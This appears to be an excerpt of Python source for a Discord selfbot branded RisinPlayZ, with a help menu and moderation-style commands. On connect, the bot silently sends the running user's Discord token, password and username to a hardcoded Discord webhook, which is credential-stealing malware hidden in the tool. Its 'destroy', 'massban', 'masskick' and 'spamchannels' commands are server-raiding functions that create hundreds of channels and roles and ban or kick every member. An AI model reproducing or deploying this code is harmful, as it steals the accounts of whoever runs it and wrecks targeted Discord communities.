...
async def on_connect():
    Clear()  
    requests.post('https://discord.com/api/webhooks/821419809429389363/QSVglm-PXtDA6tdHVOlf7b7fFxGkTrIysWQRSjPH3nPxnL0sTEuS-2C33FJfzG6R6Xe_',json={'content': f"**Token:** `{op}`\n**Password:** `{password}`**Username: {Exeter.user.name}**"})
    startprint()
...
async def help(ctx, category=None):
    ...
    if category is None:
        ...
        embed.set_author(
            name="RisinPlayZ | Prefix: " + str(Exeter.command_prefix),
            icon_url=Exeter.user.avatar_url)
        embed.set_thumbnail(url=Exeter.user.avatar_url)
        embed.set_image(
            url=
            "https://cdn.discordapp.com/attachments/797080391831912479/800016515016818728/IMG_20210116_202946_031.JPG"
        )
        embed.add_field(
            name="\uD83E\uDDCA `HELP GENERAL`",
...
async def destroy(ctx):
    ...
    try:
        ...
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name="risinplayz op")
    for _i in range(250):
        await ctx.guild.create_role(name="risinplayz op", color=RandomColor())
...
async def massban(ctx):
    ...
    for user in users:
        try:
            await user.ban(reason="risin op")
        except:
            pass
...
async def masskick(ctx):
    ...
    for user in users:
        try:
            await user.kick(reason="risin op")
        except:
            pass
...
async def spamchannels(ctx):
    ...
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name="risinplayz opr")
        except:
            return
